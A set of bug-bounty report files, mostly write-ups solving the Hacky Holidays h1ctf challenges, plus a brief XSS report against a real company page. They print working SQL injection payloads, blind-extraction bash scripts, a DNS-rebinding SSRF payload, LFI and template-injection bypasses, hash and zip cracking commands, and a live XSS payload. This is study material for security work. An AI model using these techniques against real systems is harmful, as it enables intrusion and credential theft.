In the zip file, we find 4 .php files that aren't important except for index.php that has actually valuable php code to review.
Not going to lie, this was a bit hard for me because I don't like/do code review, and I don't know php code apart from the basics, so I didn't know what to look for.
But in summary, the age parameter when signing up goes throw intval() with a maximum of 3 characters. One of the last versions of php makes intval() function (which gets the base number of the number provided) make a bigger number.
If we provide '1e5' in the age input, it will make as output 100000 and because the server is expecting just 3 numbers or less, it will cause an overflow when creating the user details.
Code 197 Bytes
1POST /signup-manager/ HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Upgrade-Insecure-Requests: 1
4
5action=signup&username=fwefgergeg&password=ergegerg&age=1e6&firstname=gergerg&lastname=YYYYYYYYYYYYYYYYYYY
The above request will add one or more 'Y' in the admin parameter, making us admin of the website and getting the flag.
<image_6>

Flag 11 - Manual SQLi and more
One of the hardest challenge, if not the hardest one. We start this challenge in /r3c0n_server_4fdk59 where there are 3 albums that when clicking them would make the following GET request:
Code 81 Bytes
1GET /r3c0n_server_4fdk59/album?hash=jdh34k HTTP/1.1
2Host: hackyholidays.h1ctf.com
After quite a long time fuzzing for directories and trying a lot of things, I noticed the hash parameter is vulnerable to SQLi:
A valid statement would result in a 404 response, while a false statement would return code 200
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k'+OR+1=1--+- - code 404
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k'+OR+1=2--+- - code 200
So I fire up sqlmap and dump the entire DB but there was no flag or anything that I could use to continue with the challenge. Now as I am a sqlmap type of user instead of manually exploiting, I had quite a hard time.
When we view an album, it shows images that are called with the following HTML code:
Code 229 Bytes
1<img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9">
and if decoded the data's value looks like this:
Code 120 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
The server is generating an auth code that is bidden to the the file that we want to read. We can't modify the file and try to get arbitrary files because the auth code would be invalid and the server actually validates it perfectly. We will come back to this later.
note: This would be a really good vector to try and find vulnerabilities in a real app. Changing the path, deleting the auth code, modifying it, etc.
We know there is an api endpoint because it is mentioned when we arrived at the page:
We are currently developing an API, apologies for anything that doesn't work quite right
So we go to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api and start trying to find possible endpoints in /r3c0n_server_4fdk59/api/* fuzzing a lot to see if we can find something. We quickly notice that we get code 401 blocking us to access anything, but on this I found a few probably unintended "bugs" that I wanted to share for people reading the report.
When trying to access normal endpoints like /api/anything we get 401. Basically[a-zA-Z0-9] returns code 401.
This restriction doesn't apply when we go 2 or more directories depth like /r3c0n_server_4fdk59/api/abc/here or when we add a special character in first path like /r3c0n_server_4fdk59/api/asdasd. or /r3c0n_server_4fdk59/api/asdasd! so I spent a lot of time trying to find a filter bypass to access some random api endpoints like /api/abc/../FUZZ or /api/./FUZZ but they all were dead ends.
Back to the SQL injection, it is possible to force the server to create an auth code for us, therefore allowing us to fuzz the api for endpoints.
Injecting the following query would make the server create an auth code for the specific file/path we want to see:
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jasda59grop'+UNION+SELECT+"2'+UNION+SELECT+1,1,'../api/whatever'+--+-",'12',1--+--
This would create an image with in the response, with the '/api/whatever' path and the auth code to view the specified directory.
With this in mind, I wrote a script that would fuzz the api endpoint, grab the urls generated by the server in the response and then make GET request to check if any of them is different from the usual response.
Code 557 Bytes
1while read line; do
2        curl -s -k "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jasda59grop%27+UNION+SELECT+%222%27+UNION+SELECT+1,1,%27../api/${line}%27+--+-%22,%2712%27,1--+-" | grep '" src=".*"' -o | sed 's/" src="//' | sed 's/"//' | sed 's/^/https\:\/\/hackyholidays.h1ctf.com/' | anew valid-endpoints > /dev/null;
3done < api.txt
4
5while read line; do
6        curl -s -k "${line}" > output;
7        if cat output | grep 'Invalid content type detected' > /dev/null; then
8                echo $line;
9        fi
10done < valid-endpoints
After running it, I found 2 endpoints that returned a different response: /api/user and /api/ping. But both of this urls were returning:
Code 209 Bytes
1GET /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXIiLCJhdXRoIjoiYmZiNmRkMDRlNjZlODU1NjRkZWJiYTNlN2IyMjJlMzQifQ== HTTP/1.1
2Host: hackyholidays.h1ctf.com
Invalid content type detected. Since it is expecting an image.
It doesn't end here! Back to the SQL injection.
It is possible to make a boolean based SQLi to guess the username and password via the username and password parameters of the /api/user endpoint. When providing a valid letter/number followed by a % the server would return Invalid content type detected in the response.
I made the following bash script based on that logic to extract the username and later the password:
Code 899 Bytes
1
2# chr function to get ascii chars
3chr() {
4  [ "$1" -lt 256 ] || return 1
5  printf "\\$(printf '%03o' "$1")"
6}
7
8while true
9do
10        for x in {48..57} {97..122};
11        do
12                letter=$(chr $x);
13                #letter=$(urlencode "$letter");
14                new="$dis";
15                url=$(curl -s -k "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jasda59grop%27+UNION+SELECT+%222%27+UNION+SELECT+1,1,%27../api/user?username=${new}${letter}%25%27+--+-%22,%2712%27,1--+--" | grep '" src=".*"' -o | sed 's/" src="//' | sed 's/"//' | grep -v 'DM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMT' | sed 's/^/https\:\/\/hackyholidays.h1ctf.com/');
16
17                curl "$url" > output 2> /dev/null;
18                if cat output | grep 'Invalid content type detected' > /dev/null; then dis="${dis}${letter}"; echo -ne "\r$dis"; fi
19        done
20done
Code 52 Bytes
1zonduu@localhost:~/h1-ctf# ./2flag11.sh 
2grinchadmin
Now we modify the script and add the username we just found, and try to get the password: ?username=grinchadmin%26password=${new}${letter}%25
Code 51 Bytes
1zonduu@localhost:~/h1-ctf# ./2flag11.sh 
2s4nt4sucks
With the username and password we found we log in and there is the flag:
<image_7>

Flag 12 - The salted hash
We start this challenge where the last one ended /attack-box. There are 3 target IPs and we can "launch a DDoS attack" to the Santa's servers and when we try to launch an attack the following request is sent to the server:
Code 162 Bytes
1GET /attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ== HTTP/1.1
2Host: hackyholidays.h1ctf.com
If base64 decode it, it shows the destination IP, and a md5 hash:
Code 67 Bytes
1{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
As soon as I saw this I knew I had to change the IP to localhost so we can take down the Grinch, but the server stops us because it validates the hash.
So after a pretty long time of pointless brute-forcing of the hash and some help of friends it is possible to decrypt it and find the salt of the hash. We need to guess that the IP is part of the hash and that the salt is something possible to brute-force from a wordlist (as direct brute-force would take too long for a ctf).
Saved the hashes with their IPs in a file hashes:
Code 138 Bytes
15f2940d65ca4140cc18d0878bc398955:203.0.113.33
22814f9c7311a82f1b822585039f62607:203.0.113.53
35aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213
And then used hashcat with rockyou wordlist: hashcat -a0 -m 10 -O hashes rockyou.txt --potfile-disable -o out
Code 174 Bytes
15f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463
22814f9c7311a82f1b822585039f62607:203.0.113.53:mrgrinch463
35aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213:mrgrinch463
The server is using the salt mrgrinch463 in the sense of salt-password, therefore it is possible to change to a desired IP of our choice and make the correct md5 hash so the server would accept it (it is possible to make any hash of any IP as we know the only salt the server uses).
I start trying payloads to try hit localhost but the server was making proper validation and resolving the hosts so localtest.me is blocked as well as all the other payloads of this list https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
It is also blocking domains or IPs if they contain any special character like @/:.
All payloads failed until the DNS rebinding payload. There are multiple ways of doing this but I used the subdomain 7f000001.c0a80001.rbndr.us that will resolve randomly to 127.0.0.1 or 192.168.0.1.
After 2 tries, I was able to hit 192.168.0.1 in the filter check and 127.0.0.1 when the DDoS attack was launched and took down the Grinch Networks server. It might work on the first try or might take a couple of tries.
Payload:
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9
Code 81 Bytes
1{"target":"7f000001.c0a80001.rbndr.us","hash":"de9d82d4ae9a61660701e7e1844ea643"}
If the attack is successful, we take down the Grinch Network server and get redirected to https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709 and complete the CTF.
<image_8>

Impact
The sum of multiple vulnerabilities resulted in the ability to take down Grinch Networks.
Great CTF and amazing work @Hacker0x01 & @adamtlangley.
Have a nice end of the year, zonduu.



==================================================

Report File: 106678.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Cross-site Scripting (XSS) - Generic

Contents:

XSS vulnerability lies on http://now.informatica.com/launch-next-bigdata-registration-inxpo.html?Source=homepage
POC
Sign up for big data management Virtual launch event
on parameter company_name inject '"><img src=x onerror=alert(1)>



==================================================

Report File: 1066801.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Server-Side Request Forgery (SSRF)

Contents:

Greetings team
Yay! Finally I made it to the end, thank you very much for launching this fantastic event, I had to review topics that I thought I knew, learned a lot and I am sure that I will continue learning with the community :)
<image_0>
Hacky Holidays!
P.S. I will put my writeup in my next comment.
Impact




==================================================

Report File: 1066914.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Server-Side Request Forgery (SSRF)

Contents:

Day 1 - Robot flag
We're presented with sample ui page without any function. So I guessed content discovery is the best way to find flag.
And robots.txt came to my mind and found the flag.
https://hackyholidays.h1ctf.com/robots.txt
Response
Code 85 Bytes
1User-agent: *
2Disallow: /s3cr3t-ar3a
3Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
Flag 1-: flag{48104912-28b0-494a-9995-a203d1e261e7}==
Day 2 - s3cr3t-ar3a
You may noticed that we saw strange text in robots.txt
Disallow: /s3cr3t-ar3a
When I tried to access this page, it look like the removed page but checked the source with Inspect Element and found the flag
Code 265 Bytes
1<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
2<p>I've moved this page to keep people out!</p>
3<p>If you're allowed access you'll know where to look for the proper page!</p>
4</div>
Flag 2-: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
Day 3 - Grinch People Rater
https://hackyholidays.h1ctf.com/people-rater
Day 3 challenge starts with a little fancy thing but nothing much yet .
There are 16 people names in page and by clicking any name makes a GET request along with their base64 decoded user id to retrieve information.
I checked the first one "Tea Avery" and his/her id was 2.
eyJpZCI6Mn0 = {"id":2}
Basically his/her id probably should be 1 but it wasn't, so who is User {"id":1} ?
I encoded {"id":1} to base64 and make a request to see what happens and of course, it was the Grinch and retrieved flag along with his information.
<image_0>
Flag 3 -: flag{b705fb11-fb55-442f-847f-0931be82ed9a}
Day 4 - Grinch Swag Shop
https://hackyholidays.h1ctf.com/swag-shop
Simple swag shop but when we tried to purchase some item, Login page was appeared.
Neither we don't have any provided credentials nor account register page, we may find a way to get access as authenticated user.
After collecting some endpoints, I got the following list
Code 65 Bytes
1/swag-shop/api/purchase
2/swag-shop/checkout/
3/swag-shop/api/login
As per my experience, I looked for /swag-shop/api/user and got the following response
Code 95 Bytes
1HTTP/1.1 400 Bad Request
2Server: nginx/1.18.0 (Ubuntu)
3....
4{"error":"Missing required fields"}
Interesting but not that much useful, then I run Arjun through this api endpoint and found a valid parameter "uuid".
<image_1>
We needed to find valid "uuid" value and I wasn't able to get it. So I fuzzed using ffuf and got the following api endpoint leaking some user session.
https://hackyholidays.h1ctf.com/swag-shop/api/sessions
<image_2>
I decoded all sessions value and one of these sessions contained valid uuid parameter value.
{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
Now all we have to do is just append the uuid value in above user api endpoint and get the flag.
<image_3>
Flag 4 -: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
Day 5 - Secure Login
https://hackyholidays.h1ctf.com/secure-login
As it said, we just need to login to get flag.
Putting random default credentials resulted "Invalid Username".It look like we need to brute force to get valid username first.
After running Burp Intruder a while with rockyou.txt , got a valid username "access".
Repeat same process for password and found "computer" as valid password.
Logged in and we see the error "No Files To Download", and the cookie parameter is interesting
securelogin:"eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0="
Decoding the value got the following text.
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
Change parameter admin to "true" and we're provided with encrypted zip file.
<image_4>
Now simply run the fcrackzip in order to crack zip file and found the password " hahahaha".
fcrackzip -u -D -p rockyou-75.txt my_secure_files_not_for_you.zip
<image_5>
Unzip the file and got the flag!!
Flag 5 -: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
Day 6 - My-diary
https://hackyholidays.h1ctf.com/my-diary/?template=entries.html
As you could see, the first thing came to my mind is LFI but failed to read local file like /etc/passwd so I tried to read default thing like index.php.
And now we can see the source code
Code 689 Bytes
1<?php
2if( isset($_GET["template"])  ){
3    $page = $_GET["template"];
4    //remove non allowed characters
5    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
6    //protect admin.php from being read
7    $page = str_replace("admin.php","",$page);
8    //I've changed the admin file to secretadmin.php for more security!
9    $page = str_replace("secretadmin.php","",$page);
10    //check file exists
11    if( file_exists($page) ){
12       echo file_get_contents($page);
13    }else{
14        //redirect to home
15        header("Location: /my-diary/?template=entries.html");
16        exit();
17    }
18}else{
19    //redirect to home
20    header("Location: /my-diary/?template=entries.html");
21    exit();
22}
$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
The first preg_replace() function does to prevent from reading local file so we might skip this part.
//protect admin.php from being read
$page = str_replace("admin.php","",$page);
As it said, the above str_replace() function protect from being read "admin.php" but we can simply bypass this by tricking like
?template=admadmin.phpin.php
<image_6>
but our flag is in "secretadmin.php" so we can simply use to bypass the same way above using the payload
https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretadminadmin.php.phpmin.php
And we got the flag!!
<image_7>
Flag 6 -: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
Day 7 - Hate Mail Generator
https://hackyholidays.h1ctf.com/hate-mail-generator
By looking sample campaign, I got know that we can use template to create campaign but generating new campaign causing error but we can use preview.
Code 168 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1
2Host: hackyholidays.h1ctf.com
3......
4preview_markup=Hello,{{name}}&preview_data={"name":"Alice","email":"alice@test.com"}
And we got the response
Code 12 Bytes
1Hello, Alice
I tried normal template injection payload and didn't work then I noticed that we could use to render the .html file using {template:cbdj3_grinch_header.html}
At this time, I run dirsearch and found this template folder https://hackyholidays.h1ctf.com/hate-mail-generator/templates/
<image_8>
As we can see, the 38dhs_admins_only_header.html file is interesting but it give response 403.But what if we can render this file using above
template markup.I tried to render this page like this
Code 205 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1
2Host: hackyholidays.h1ctf.com
3......
4preview_markup=Hello,{{name}}&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
And we got the flag straightforward
<image_9>
Flag 7 -: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
Day 8 - Grinch Forum
https://hackyholidays.h1ctf.com/forum
It's simple , we just need to login to get the flag but how?
I tried different ways to login like brute forcing username/password, sqli, but nothing worked.
Also found the phpmyadmin login page but couldn't able to login
Then I had no idea , just search "Grinch Networks" in google and found interesting repo created by challenge author in his profile.
After looking for a while, I thought he just leaked this repo by mistake but i just noticed there are some commits in repo.
https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae
Code 622 Bytes
1 static public function read(){
2        if( gettype(self::$read) == 'string' ) {
3            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
4            self::$read = new DbConnect( false, '', '','' );
5        }
6        return self::$read;
7    }
8@@ -146,7 +146,7 @@ public static function closeAll(){
9     */
10    static public function write(){
11        if( gettype(self::$write) == 'string' ) {
12            self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
13            self::$write = new DbConnect( true,  '', '','' );
14        }
15        return self::$write;
16    }
By comparing with new code, he just removed these credentials from repo.So I was able to login phpmyadmin using this info and found Admin login username and password.
Code 182 Bytes
1id 	username 	password 	                                                                 admin
21 	grinch 	35D652126CA1706B59DB02C93E0C9FBF 	1
32 	max 	388E015BC43980947FCE0E5DB16481D1
Simply cracked the grinch password and we logged into admin panel and found the flag
<image_10>
Flag 8 -: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
Day 9 - Evil Quiz
Firstly, when we try to simple name and submit quiz answers
Code 124 Bytes
1POST /evil-quiz/ HTTP/1.1
2Host: hackyholidays.h1ctf.com
3.....
4Cookie: session=7d63eaccc80ec7b6553c0b19ec10e4d0
5....
6name=lol
Got the response in https://hackyholidays.h1ctf.com/evil-quiz/score endpoint saying
"There is 1 other player(s) with the same name as you!"
But adding ' at the end of name got the response "There is 0 other player(s) with the same name as you!"
and I believed "name" parameter is vulnerable to second order sql injection.
now we need to fix the query to confirm the sql injection
Adding -- as comment didn't work
Adding --+- as comment didn't work
Adding # as comment worked
So I confirmed this parameter is probably vulnerable to second order sql injection. For further exploitation,I run sqlmap but didn't success. ( may be I missed something with sqlmap )
Then I decided to do manual injection with boolean based as I was lazy to automate by writing own script .
Getting table
Code 218 Bytes
1Request
2
3name = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))<100#
4
5Response
6
7There is 769468 other player(s) with the same name as you!
It means TRUE that the ASCII value of table_name's first character is less than 100 and we need to specify more
Code 210 Bytes
1Request
2
3name=lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))<90#
4
5Response
6
7There is 0 other player(s) with the same name as you!
It means FALSE that the ASCII value of table_name's first character isn't less than 90 so we can confirm the first character is between 90-100.
By trying each number, we found the valid one.
Code 142 Bytes
1name=lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))=97#
2
3TRUE
97 is the value of ASCII character "a" so we know that the first character of table name is "a".
we can get the next letter by incrementing the 1, to a 2, in our substring() statement.
Code 439 Bytes
1name = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),2,1))>90#
2
3TRUE
4
5name = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),2,1))<100#
6
7FALSE
8
9name = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),2,1))=100#
10
11TRUE
Converting 100 to ASCII character we got "d" . so probably the table_name is "admin".
Now let's get the columns with the following query.
Code 139 Bytes
1name =lol'+or+Ascii(substring((Select+concat(column_name)+from+information_schema.columns+where+table_name=0x61646d696e+limit+0,1),1,1))>0#
Keep doing the same way as above, so far we have the valid columns "username" and "passsword"
Getting username
Code 86 Bytes
1name = lol'+or+Ascii(substring((Select+concat(username)+from+admin+limit+0,1),1,1))>0#
Getting password
Code 86 Bytes
1name = lol'+or+Ascii(substring((Select+concat(password)+from+admin+limit+0,1),1,1))>0#
Now we have the username and password to login admin panel
username = admin

password = S3creT_p4ssw0rd-$
Upon logging with above credentials, we can see the flag finally.
<image_11>
PS. Actually this challenge took me 5-6 hours to get the final flag because the server takes too long to response to the request.
Flag 9 -: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
Day 10 - SignUp Manager
https://hackyholidays.h1ctf.com/signup-manager/
At first sight, we're provided with simple SignUp and Login page.
By checking source code, found the comment
Upon looking for README.md , we know file zip file path which might be included source codes.
https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip
Analyzing the source code
After reviewing multiples php files, index.php look interesting.
Let's take a look at Signup function
Code 1.58 KiB
1<?php
2        if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
3            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
4            if (strlen($username) < 3) {
5                $errors[] = 'Username must by at least 3 characters';
6            } else {
7                if (isset($all_users[$username])) {
8                    $errors[] = 'Username already exists';
9                }
10            }
11            $password = md5($_POST["password"]);
12            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
13            if (strlen($firstname) < 3) {
14                $errors[] = 'First name must by at least 3 characters';
15            }
16            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
17            if (strlen($lastname) < 3) {
18                $errors[] = 'Last name must by at least 3 characters';
19            }
20            if (!is_numeric($_POST["age"])) {
21                $errors[] = 'Age entered is invalid';
22            }
23            if (strlen($_POST["age"]) > 3) {
24                $errors[] = 'Age entered is too long';
25            }
26            $age = intval($_POST["age"]);
27            if (count($errors) === 0) {
28                $cookie = addUser($username, $password, $age, $firstname, $lastname);
29                setcookie('token', $cookie, time() + 3600);
30                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
31                exit();
32            }
33        }
34?>
As far as we saw, Signup function straightforward expect the character limit for various input. OK , now let's jump into AddUser() function
Code 538 Bytes
1<?php
2function addUser($username,$password,$age,$firstname,$lastname){
3    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
4    $line = '';
5    $line .= str_pad( $username,15,"#");
6    $line .= $password;
7    $line .= $random_hash;
8    $line .= str_pad( $age,3,"#");
9    $line .= str_pad( $firstname,15,"#");
10    $line .= str_pad( $lastname,15,"#");
11    $line .= 'N';
12    $line = substr($line,0,113);
13    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
14    return $random_hash;
15?>
It simply takes our input and
fill up to 15 characters
append these all in one line using ".=" operator
put all conetnt in users.txt
return random_hash to set user session.
Now take a look at, builduser() function
Code 878 Bytes
1<?php
2function buildUsers(){
3    $users = array();
4    $users_txt = file_get_contents('users.txt');
5    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
6        if( strlen($user_str) == 113 ) {
7            $username = str_replace('#', '', substr($user_str, 0, 15));
8            $users[$username] = array(
9                'username' => $username,
10                'password' => str_replace('#', '', substr($user_str, 15, 32)),
11                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
12                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
13                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
14                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
15                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
16            );
17        }
18    }
19    return $users;
20?>
The first line set the array which named $users and get user info from file content of users.txt.
Then get the each stored values using substr() and removed "#" characters and save at $users arrray.
The last one is interesting that it compare the last character of our strings to "Y"
'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
and if it returns true, we got admin access by following code.
Code 327 Bytes
1<?php
2$all_users = buildUsers();
3$page = 'signup.php';
4if( isset($_COOKIE["token"]) ){
5    foreach( $all_users as $u ){
6        if( $u["cookie"] === $_COOKIE["token"] ){
7            if( $u["admin"] ){
8                $page = 'admin.php';
9            }else{
10                $page = 'user.php';
11            }
12        }
13    }
14}
15?>
But normally it's not possible to make the last character "Y" because you might notice that $line .= 'N'; append 'N' in the last of our info in user.txt.
So we need to find a way to push our input into last character to be "Y".
After looking hours for multiple function,
$age = intval($_POST["age"]);
This intval() function took my attention. We are allowed to set age number up to 3 characters and these number needed to be numeric.
Code 266 Bytes
1<?php
2if (!is_numeric($_POST["age"])) {
3                $errors[] = 'Age entered is invalid';
4            }
5            if (strlen($_POST["age"]) > 3) {
6                $errors[] = 'Age entered is too long';
7            }
8            $age = intval($_POST["age"]);
9?>
I read the documentation abot intval() function and came to know that we can use this scientific notation 'e' to get longer number with 3 characters.
Code 210 Bytes
1<?php
2echo intval(1e3);                        //1000
3echo intval(1e4);                       //10000
4echo intval(1e5);                       // 100000 
5echo intval(1e10);                    //  10000000000 
6?>
Now, it's time to construct our final payload to get flag.when we set age number to "1e5" the server calculate the value and response with 100000.
So the final input payload become like this.
Code 270 Bytes
1POST /signup-manager/ HTTP/1.1
2Host: hackyholidays.h1ctf.com
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0
4.....
5.....
6
7action=signup&username=LMAO&password=12345&age=1e5&firstname=XXXXXXXXXXXXXXX&lastname=YYYYYYYYYYYYYYY
Our last name field become the last character "Y" because the following code stripped the string if it was more than 113 characters.
$line = substr($line,0,113);
And now when this function check the last character of our string it will return TRUE .
'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
Finally, we got admin access and found the flag.
<image_12>
Flag 10 -: flag{99309f0f-1752-44a5-af1e-a03e4150757d}
Day 11 - Grinch Recon Server
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/
Initial running dirsearch found the api endpoint https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/
But when we try to make any request to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/* , got the response saying
"This endpoint cannot be visited from this IP address"
I thought it might be accessible by adding some custom headers but nothing worked.
And then looked into photo album,it didn't take long to identify that the hash parameter is vulnerable to sql injection.
Code 869 Bytes
1Identifying Sql injection
2
3https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol'            Response  404
4
5https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k--+-     Response 200
6
7https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k' order by  4--+-  Reponse 404
8
9https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k ' order+by 3--+-   Response 200
10
11Getting vulnerable column
12
13https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select 1,2,3--+-     Response 200 and 3rd column is printed
14(Please note that we need to remove original hash value to see vulnerbale column)
15
16Trying to extract table name using the query
17
18https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select 1,2,table_name+from information_schema.tables where table_schema=database()--+-
But it didn't work. After trying to bypass with various ways, something came up with Double Query injcetion.
Code 334 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1'","2","3"--+-
2
3Putting ' in the first column and something strange happend and fix the query by comment(--+-) and got the normal response back.
4
5>>https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1'--+-","2","3"--+-
Now we can confirm double query injection is possible here. Let's move further.
Code 484 Bytes
1>>https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' order by 4--+-","2","3"--+-    ERROR
2
3>>https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' order by 3--+-","2","3"--+-     Normal Reponse
4
5>>https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' union select \"1\",\"2\",\"3\"--+-","2","3"--+-
6
7{"image":"r3c0n_server_4fdk59\/uploads\/3","auth":"fea7507478aa8225c022527b1763fb33"}
Upon executing above query, we got the response which vulnerable column is reflecting image request data.
Code 477 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' union select \"1\",\"2\",database()--+-","2","3"--+-
2
3{"image":"r3c0n_server_4fdk59\/uploads\/recon","auth":"015cc4ed326cfc9e314afdaf594a5ce3"}
4
5https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' union select \"1\",\"2\",version()--+-","2","3"--+-
6
7{"image":"r3c0n_server_4fdk59\/uploads\/8.0.22-0ubuntu0.20.04.3","auth":"03d2bc97a58dc15c4eaf5d4fa2d9f93d"}
Combining with path traversal, we can generate valid auth hash for any endpoint which we want to make reuqest.
Code 234 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/\"--+-","2","3"--+-
2
3{"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/","auth":"05a7e708a5f3da76506023047628829d"}
Now we can perfrom request to api endpoint /api/* with valid auth hash.
Code 189 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9
